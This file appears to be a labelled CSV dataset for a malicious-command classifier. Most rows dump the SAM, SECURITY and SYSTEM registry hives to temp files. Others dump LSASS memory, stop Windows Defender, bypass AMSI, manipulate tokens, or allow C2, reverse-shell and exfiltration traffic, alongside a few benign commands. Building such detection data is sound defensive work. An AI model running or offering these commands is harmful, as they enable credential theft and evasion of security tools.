text,label
"cmd.exe /c ""reg save hklm\security c:\windows\temp\pkkga7he.save""",1
reg export hklm\system c:\windows\temp\ahta3qxb.save,1
reg export hklm\security c:\windows\temp\gj2vkg4r.save,1
reg save hklm\system c:\windows\temp\luesoyyh.save,1
reg export hklm\system c:\windows\temp\3jq447kb.save,1
reg save hklm\sam c:\windows\temp\2qfox4l3.save,1
reg export hklm\system c:\windows\temp\cg5kp2k3.save,1
reg save hklm\system c:\windows\temp\5346mv0a.save,1
reg export hklm\system c:\windows\temp\a6575djt.save,1
reg save hklm\system c:\windows\temp\jhmohs1e.save,1
reg   save   hklm\security   c:\windows\temp\d8lpmcrb.save,1
reg export hklm\sam c:\windows\temp\88a2zsvf.save,1
reg save hklm\system c:\windows\temp\2ninpcsx.save,1
reg export hklm\system c:\windows\temp\qyz3eb79.save,1
reg export hklm\security c:\windows\temp\mibf1p26.save,1
reg export hklm\system c:\windows\temp\sgaqrcxd.save,1
reg export hklm\system c:\windows\temp\vp71sy1n.save,1
reg export hklm\system c:\windows\temp\g0jo53h7.save,1
reg export hklm\system c:\windows\temp\mz6td76a.save,1
reg export hklm\security c:\windows\temp\on5vp7nr.save,1
"cmd.exe /c ""sc   query   windefend""",0
reg export hklm\security c:\windows\temp\qa1mtb94.save,1
reg save hklm\sam c:\windows\temp\pk2715iz.save,1
reg export hklm\system c:\windows\temp\w62f8ihm.save,1
reg export hklm\security c:\windows\temp\7a0t0y7g.save,1
reg save hklm\system c:\windows\temp\5uuurla9.save,1
reg export hklm\security c:\windows\temp\10m6tll9.save,1
reg save hklm\security c:\windows\temp\qvp8bph8.save,1
reg save hklm\system c:\windows\temp\vt69yjhi.save,1
reg save hklm\sam c:\windows\temp\j4xdiaro.save,1
reg  save  hklm\security  c:\windows\temp\d2isjh3y.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg  save  hklm\system  c:\windows\temp\nxvshqm3.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool openprocesstoken(...)""",3
reg export hklm\security c:\windows\temp\njmafqcp.save,1
reg save hklm\security c:\windows\temp\fpvqxoac.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\security c:\windows\temp\ud477h4a.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\iu6jx6hr.save,1
"powershell -nop -c ""dir   c:\users""",0
reg export hklm\sam c:\windows\temp\g7u5xjef.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\security c:\windows\temp\j8uz8us6.save,1
reg export hklm\security c:\windows\temp\aj1kiaxn.save,1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg export hklm\sam c:\windows\temp\5gq8u6b3.save,1
reg export hklm\system c:\windows\temp\ebe0u46c.save,1
reg export hklm\security c:\windows\temp\xcqilb0s.save,1
reg save hklm\security c:\windows\temp\d0eelz3x.save,1
reg export hklm\sam c:\windows\temp\26iunx9f.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\security c:\windows\temp\j5bsmat3.save,1
reg export hklm\security c:\windows\temp\3bzowpi7.save,1
reg save hklm\system c:\windows\temp\2giziym4.save,1
reg save hklm\system c:\windows\temp\8dgjl0y7.save,1
reg export hklm\system c:\windows\temp\t8rb09c6.save,1
reg save hklm\security c:\windows\temp\djocxwdd.save,1
"powershell -nop -c ""sc   query   windefend""",0
reg export hklm\security c:\windows\temp\yh1vsp3y.save,1
reg save hklm\security c:\windows\temp\4kdpfc6b.save,1
reg save hklm\sam c:\windows\temp\j26721mo.save,1
reg save hklm\security c:\windows\temp\90hbcf3g.save,1
reg save hklm\security c:\windows\temp\q0s2clqi.save,1
reg save hklm\system c:\windows\temp\at6l42er.save,1
reg export hklm\security c:\windows\temp\sea0qfor.save,1
reg export hklm\system c:\windows\temp\hcc8a7no.save,1
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg save hklm\system c:\windows\temp\a7lej508.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg save hklm\security c:\windows\temp\a8tmgtzw.save,1
reg save hklm\sam c:\windows\temp\9k1zux9b.save,1
reg save hklm\system c:\windows\temp\vicsqd4g.save,1
netsh   dump   >   netconfig.txt,0
reg export hklm\security c:\windows\temp\o8zz8zhj.save,1
reg save hklm\system c:\windows\temp\7icqnnoo.save,1
reg export hklm\sam c:\windows\temp\xjcq6wmt.save,1
"powershell -nop -c ""netsh  dump  >  netconfig.txt""",0
reg export hklm\sam c:\windows\temp\1jy9xp3v.save,1
reg save hklm\security c:\windows\temp\xjqscmtw.save,1
"cmd.exe /c ""reg   query   hkcu\console""",0
reg export hklm\system c:\windows\temp\jai7wnjv.save,1
reg save hklm\sam c:\windows\temp\so5e4n2d.save,1
reg save hklm\system c:\windows\temp\ygesatc4.save,1
reg save hklm\system c:\windows\temp\ebdzbx82.save,1
reg export hklm\system c:\windows\temp\di8qcoll.save,1
reg export hklm\sam c:\windows\temp\7fgtveh1.save,1
reg save hklm\security c:\windows\temp\n7luvq6e.save,1
reg save hklm\system c:\windows\temp\42jnwl4u.save,1
reg save hklm\sam c:\windows\temp\quigtcgi.save,1
reg save hklm\system c:\windows\temp\j1ithgzs.save,1
"cmd.exe /c ""backup-utility save registry config""",0
reg save hklm\sam c:\windows\temp\8fjuigf8.save,1
reg save hklm\sam c:\windows\temp\251u82o4.save,1
reg export hklm\security c:\windows\temp\e615fcx9.save,1
reg   save   hklm\system   c:\windows\temp\fziprqm8.save,1
reg export hklm\system c:\windows\temp\irj150fh.save,1
reg export hklm\system c:\windows\temp\5zrz6121.save,1
reg export hklm\security c:\windows\temp\37yx632c.save,1
reg save hklm\security c:\windows\temp\g6j9e04k.save,1
reg save hklm\security c:\windows\temp\oh0ecivr.save,1
reg export hklm\system c:\windows\temp\whcdd02g.save,1
reg export hklm\system c:\windows\temp\l6vh9xl4.save,1
reg save hklm\security c:\windows\temp\tl80hd5f.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\system c:\windows\temp\yfsq29f6.save,1
reg save hklm\system c:\windows\temp\e0u7rx9r.save,1
runas /user:administrator cmd.exe,3
reg save hklm\sam c:\windows\temp\9mx4wi43.save,1
reg export hklm\system c:\windows\temp\fn3cj665.save,1
reg save hklm\sam c:\windows\temp\nmus99bm.save,1
reg export hklm\system c:\windows\temp\jdj1c2i7.save,1
reg save hklm\system c:\windows\temp\dqav7dpw.save,1
reg export hklm\sam c:\windows\temp\40kbcf9x.save,1
reg export hklm\system c:\windows\temp\plpuche8.save,1
reg save hklm\security c:\windows\temp\oi6nu2oc.save,1
reg export hklm\sam c:\windows\temp\0dlesn3r.save,1
reg save hklm\system c:\windows\temp\ljeaj5tx.save,1
reg save hklm\sam c:\windows\temp\iu4m9e3c.save,1
reg save hklm\security c:\windows\temp\07gupeuy.save,1
reg save hklm\security c:\windows\temp\nmod2eat.save,1
reg save hklm\sam c:\windows\temp\n9v0o69t.save,1
reg export hklm\sam c:\windows\temp\lt9t5fwv.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
reg  save  hklm\sam  c:\windows\temp\0bd98rew.save,1
reg export hklm\security c:\windows\temp\ijnkivs9.save,1
reg export hklm\system c:\windows\temp\84rcwa80.save,1
reg save hklm\sam c:\windows\temp\bsscxad1.save,1
reg save hklm\security c:\windows\temp\sug1l0p5.save,1
reg save hklm\system c:\windows\temp\k6qpwna2.save,1
reg save hklm\sam c:\windows\temp\mjb5134p.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\0z780l34.save""",1
reg export hklm\system c:\windows\temp\zb2gky3a.save,1
reg save hklm\system c:\windows\temp\aiqjk6ud.save,1
reg save hklm\security c:\windows\temp\ct01buh2.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\ovbq5m1e.save""",1
reg save hklm\sam c:\windows\temp\k2tuln6r.save,1
reg save hklm\sam c:\windows\temp\mkzg0h6h.save,1
reg export hklm\sam c:\windows\temp\h24w80am.save,1
reg save hklm\security c:\windows\temp\v002ebak.save,1
reg   save   hklm\security   c:\windows\temp\iakclhsp.save,1
"powershell -nop -c ""whoami   /groups""",0
reg export hklm\security c:\windows\temp\ykv4jen0.save,1
reg save hklm\sam c:\windows\temp\jbg52xo7.save,1
reg save hklm\security c:\windows\temp\7cwz3ecz.save,1
reg export hklm\sam c:\windows\temp\2n9h1ku2.save,1
reg export hklm\system c:\windows\temp\ufl12eeb.save,1
reg export hklm\sam c:\windows\temp\3k309cej.save,1
reg export hklm\system c:\windows\temp\w86lbd9t.save,1
"cmd.exe /c ""klist   get   krbtgt/domain.local""",3
reg export hklm\system c:\windows\temp\2d9quz35.save,1
reg export hklm\system c:\windows\temp\y0dd3fgh.save,1
"powershell -nop -c ""powershell   get-process""",0
reg export hklm\sam c:\windows\temp\7qzfs7e7.save,1
reg save hklm\system c:\windows\temp\99mf4izr.save,1
reg save hklm\security c:\windows\temp\j0ihsbrk.save,1
reg export hklm\sam c:\windows\temp\v2xxub4d.save,1
reg save hklm\sam c:\windows\temp\nvlyau86.save,1
reg save hklm\system c:\windows\temp\lpinx7nx.save,1
reg export hklm\security c:\windows\temp\36d480v8.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\i44rbz78.save""",1
reg export hklm\security c:\windows\temp\l2aiw5te.save,1
reg save hklm\security c:\windows\temp\q41abcxs.save,1
reg save hklm\sam c:\windows\temp\9h2t1818.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\2kfge8fn.save""",1
reg export hklm\security c:\windows\temp\zgsyvt8o.save,1
reg save hklm\system c:\windows\temp\wvqqo74b.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\5stzkgq6.save""",1
reg export hklm\sam c:\windows\temp\3tz1youl.save,1
reg export hklm\system c:\windows\temp\u7l0py6p.save,1
reg export hklm\system c:\windows\temp\6on5loji.save,1
reg export hklm\security c:\windows\temp\v4jlgnpc.save,1
reg save hklm\sam c:\windows\temp\tp64gn27.save,1
reg export hklm\sam c:\windows\temp\e8g47rdw.save,1
reg save hklm\sam c:\windows\temp\9sfvp8as.save,1
reg export hklm\sam c:\windows\temp\yq2qf2cz.save,1
reg save hklm\system c:\windows\temp\ro8tdcp3.save,1
reg export hklm\sam c:\windows\temp\78b5w3zn.save,1
reg save hklm\sam c:\windows\temp\q89wsok6.save,1
reg save hklm\system c:\windows\temp\jsh6uj5g.save,1
reg save hklm\sam c:\windows\temp\i4kdqyno.save,1
reg save hklm\system c:\windows\temp\60krogw3.save,1
reg export hklm\sam c:\windows\temp\5vcs48cb.save,1
reg save hklm\security c:\windows\temp\dfk6mdlp.save,1
reg save hklm\sam c:\windows\temp\0atwzurc.save,1
reg export hklm\system c:\windows\temp\jti2z4sp.save,1
reg save hklm\security c:\windows\temp\p1ijpt3r.save,1
reg save hklm\security c:\windows\temp\3o5bzmc6.save,1
reg export hklm\sam c:\windows\temp\ik1mnuda.save,1
reg save hklm\security c:\windows\temp\3cdxs4h7.save,1
reg export hklm\sam c:\windows\temp\25kor4ec.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\security c:\windows\temp\bak3583m.save,1
reg export hklm\system c:\windows\temp\tz18jwqd.save,1
reg export hklm\sam c:\windows\temp\w6jkpck9.save,1
reg export hklm\sam c:\windows\temp\i4xy5twj.save,1
reg save hklm\sam c:\windows\temp\n0av3xzv.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\sa57di87.save""",1
reg export hklm\sam c:\windows\temp\lvjaamdn.save,1
reg save hklm\security c:\windows\temp\bkclz46q.save,1
reg save hklm\security c:\windows\temp\jvfos1an.save,1
reg export hklm\security c:\windows\temp\dfqgu0oi.save,1
reg export hklm\sam c:\windows\temp\cyrzttib.save,1
"powershell -nop -c ""node   server.js   --port   3000""",0
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\5cb0x5xy.save""",1
reg export hklm\security c:\windows\temp\oepwfvwd.save,1
reg export hklm\security c:\windows\temp\38tywbi5.save,1
reg   save   hklm\system   c:\windows\temp\i02tnvmh.save,1
reg save hklm\system c:\windows\temp\gg66xv57.save,1
reg save hklm\security c:\windows\temp\6c672pfs.save,1
reg export hklm\sam c:\windows\temp\s2341r29.save,1
reg save hklm\system c:\windows\temp\275iavp1.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\ty36729j.save""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\mvlv8zdk.save""",1
reg export hklm\system c:\windows\temp\j4923jyr.save,1
reg export hklm\security c:\windows\temp\g8s0d7am.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\wrlb55vh.save""",1
reg export hklm\system c:\windows\temp\awcln0v7.save,1
reg save hklm\system c:\windows\temp\52m3h0a9.save,1
reg export hklm\security c:\windows\temp\1tv54e81.save,1
reg save hklm\sam c:\windows\temp\5v62mnpr.save,1
reg export hklm\system c:\windows\temp\p8e40gx4.save,1
reg export hklm\security c:\windows\temp\brhnyqn8.save,1
reg export hklm\system c:\windows\temp\dvwxvzzo.save,1
reg export hklm\sam c:\windows\temp\920huzjo.save,1
reg save hklm\system c:\windows\temp\1rd2svd2.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\i5xyzlze.save""",1
reg save hklm\system c:\windows\temp\3v7oc32w.save,1
reg export hklm\sam c:\windows\temp\v7lxw05l.save,1
reg export hklm\security c:\windows\temp\ijsfw7v0.save,1
reg export hklm\system c:\windows\temp\a4qug11n.save,1
reg save hklm\security c:\windows\temp\33p75u5r.save,1
reg export hklm\security c:\windows\temp\dlovzcm5.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg export hklm\system c:\windows\temp\vdaesajo.save,1
reg export hklm\security c:\windows\temp\metlirkt.save,1
reg export hklm\sam c:\windows\temp\t3a0ptus.save,1
reg save hklm\security c:\windows\temp\d9y0isvn.save,1
reg save hklm\system c:\windows\temp\qrnopiwv.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\system c:\windows\temp\iiw8239s.save,1
reg save hklm\system c:\windows\temp\kszt54dr.save,1
reg export hklm\sam c:\windows\temp\oejlyh86.save,1
reg save hklm\sam c:\windows\temp\r50ly5lq.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\oa0btnmc.save""",1
reg save hklm\sam c:\windows\temp\6fde2p44.save,1
reg export hklm\security c:\windows\temp\swpp8hgq.save,1
reg save hklm\sam c:\windows\temp\tba1pkhq.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\1kbnh6xl.save""",1
reg save hklm\system c:\windows\temp\q80h6d0y.save,1
reg save hklm\security c:\windows\temp\aw4nbr5v.save,1
reg export hklm\sam c:\windows\temp\77x0n3p1.save,1
reg export hklm\system c:\windows\temp\nx5c3uh8.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg export hklm\system c:\windows\temp\54u19gn9.save,1
"powershell -nop -c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
reg save hklm\system c:\windows\temp\91foitpt.save,1
reg export hklm\sam c:\windows\temp\ktvl898b.save,1
reg export hklm\sam c:\windows\temp\7wwwmyvx.save,1
reg save hklm\security c:\windows\temp\b9mh007j.save,1
"powershell -nop -c ""dir c:\users""",0
reg save hklm\security c:\windows\temp\r5lofn19.save,1
reg export hklm\security c:\windows\temp\atyqnrwo.save,1
reg save hklm\sam c:\windows\temp\w5k043o5.save,1
reg save hklm\sam c:\windows\temp\7bshopfo.save,1
reg save hklm\sam c:\windows\temp\jkhn7k6n.save,1
reg save hklm\system c:\windows\temp\weov1mzp.save,1
reg export hklm\system c:\windows\temp\c5b3s3bg.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg export hklm\sam c:\windows\temp\kxnv1706.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\s.dat""",1
reg export hklm\sam c:\windows\temp\nvfbf2t8.save,1
reg save hklm\system c:\windows\temp\hvyu04yg.save,1
reg export hklm\system c:\windows\temp\m4o9iusb.save,1
reg save hklm\security c:\windows\temp\ybt7aa10.save,1
reg save hklm\sam c:\windows\temp\unzjceuv.save,1
reg save hklm\security c:\windows\temp\k1yqcpli.save,1
reg export hklm\security c:\windows\temp\tn5usk18.save,1
reg save hklm\sam c:\windows\temp\rmqeo76m.save,1
reg save hklm\system c:\windows\temp\old17n07.save,1
reg export hklm\system c:\windows\temp\5zts6f1j.save,1
reg export hklm\sam c:\windows\temp\82wojxwf.save,1
reg save hklm\security c:\windows\temp\mopsj8ce.save,1
reg export hklm\system c:\windows\temp\5vwyx7zt.save,1
reg save hklm\security c:\windows\temp\6m34zqqq.save,1
reg   save   hklm\system   c:\windows\temp\vfeljluk.save,1
"cmd.exe /c ""sc stop windefend""",2
reg save hklm\security c:\windows\temp\shswneyt.save,1
reg save hklm\system c:\windows\temp\j9q5nbmm.save,1
reg save hklm\security c:\windows\temp\34az3n1i.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
"powershell -nop -c ""backup-utility write hklm\software to c:\backups\config.dat""",0
reg save hklm\system c:\windows\temp\g8icvxmp.save,1
reg export hklm\sam c:\windows\temp\ezpeg7vu.save,1
reg export hklm\security c:\windows\temp\4fx0yap4.save,1
reg save hklm\system c:\windows\temp\qyevka34.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)""",3
reg export hklm\sam c:\windows\temp\q7ts11sr.save,1
"[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)",3
"powershell -nop -c ""sc  query  windefend""",0
reg save hklm\system c:\windows\temp\3zrg07r7.save,1
reg export hklm\security c:\windows\temp\1eqqn7f2.save,1
reg save hklm\system c:\windows\temp\czt586xs.save,1
reg save hklm\sam c:\windows\temp\fw25v1ul.save,1
reg save hklm\sam c:\windows\temp\1xkxttj7.save,1
reg export hklm\system c:\windows\temp\mh1m109g.save,1
reg save hklm\system c:\windows\temp\cdxh9a4x.save,1
reg save hklm\system c:\windows\temp\g4lz68mn.save,1
reg export hklm\security c:\windows\temp\9f4fqp1z.save,1
reg save hklm\sam c:\windows\temp\5wc4moh4.save,1
reg export hklm\security c:\windows\temp\w1y2vo0p.save,1
